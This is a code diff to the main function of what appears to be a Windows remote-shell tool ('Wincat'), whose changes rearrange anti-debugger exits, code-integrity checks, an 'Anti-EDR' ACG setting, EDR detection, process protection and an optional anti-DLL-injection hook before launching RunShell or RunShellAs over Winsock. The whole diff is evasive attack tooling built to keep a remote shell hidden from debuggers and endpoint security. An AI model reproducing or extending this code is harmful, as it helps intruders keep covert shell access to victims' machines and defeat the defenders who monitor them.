@@ -25,10 +25,10 @@
 #include "LoadAPI.h"
 
 
-
-#pragma comment(lib, "Userenv.lib")
+//#pragma comment(lib, "Userenv.lib")
+//#pragma comment(lib, "Wininet.lib")
+//#pragma comment(lib, "Cabinet.lib")
 #pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "Wininet.lib")
 
 
 BOOL CopyWinNC(Kernel32_API Kernel32, const char* wincatDefaultPath) {
@@ -49,36 +49,37 @@ int wmain(int argc, WCHAR* argv[]){
 
     //////////////////// Protect process ///////////////////
     //  (Anti-DLL injection)
-    //SetHook();
+#if SET_HOOK_LOAD
+    SetHook();
+#endif
 
     if (EnableACG())
         printMsg(STATUS_OK, LEVEL_DEFAULT, "Anti-EDR - ACG enable\n");
     else
         printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Fail to enable ACG\n");
 
-    if (!CheckCodeSection())
-        exit(0);
-
     if (IsDebuggerPresentPEB()) {
-        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Debugger detected");
+        printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Debugger detected !\n");
 #if !_DEBUG
         exit(0);
 #endif
     } else
-        printMsg(STATUS_INFO, LEVEL_VERBOSE, "Check For Debugger[2]: OK\n");
+        printMsg(STATUS_INFO, LEVEL_VERBOSE, "Check For Debugger: OK\n");
 
     EDRChecker();
-
-    if(!CheckCodeSection())
-        exit(0);
     //
     //////////////////// Protect process ///////////////////
 
+
+
     API_Call APICall;
     if (!loadApi(&APICall)) {
-        printf("Fail to load api\n");
-        system("pause");
+        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to load api");
+        //system("pause");
+        return TRUE;
     }
+    if (!CheckCodeSection(APICall.Kernel32Api))
+        exit(0);
 
     if (!GetArguments(argc, argv, &listAgrument)) {
         if (IsRunAsAdmin(APICall.Advapi32Api)) {
@@ -89,7 +90,7 @@ int wmain(int argc, WCHAR* argv[]){
                 if (GetInfoPipeSystem(&listAgrument)){
                     ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     initWSAS();
-                    RunShell(APICall.Kernel32Api, APICall.Advapi32Api,listAgrument);
+                    RunShell(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Ws2_32Api, listAgrument);
                 } else{
                     return FALSE;
                 }
@@ -97,7 +98,8 @@ int wmain(int argc, WCHAR* argv[]){
         }
         return TRUE;
     }
-        
+    if (!CheckCodeSection(APICall.Kernel32Api))
+        exit(0);
     
     ////////////////////// Copy Wincat /////////////////////
     // 
@@ -128,7 +130,7 @@ int wmain(int argc, WCHAR* argv[]){
                 case PAYLOAD_RECV_PS:
                     if (listAgrument.lpszUsername[0] == 0) {
                         ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
-                        RunShell(APICall.Kernel32Api, APICall.Advapi32Api, listAgrument);
+                        RunShell(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Ws2_32Api, listAgrument);
                     }else
                         RunShellAs(APICall.Kernel32Api, APICall.Advapi32Api, APICall.UserenvApi, listAgrument);
                     break;
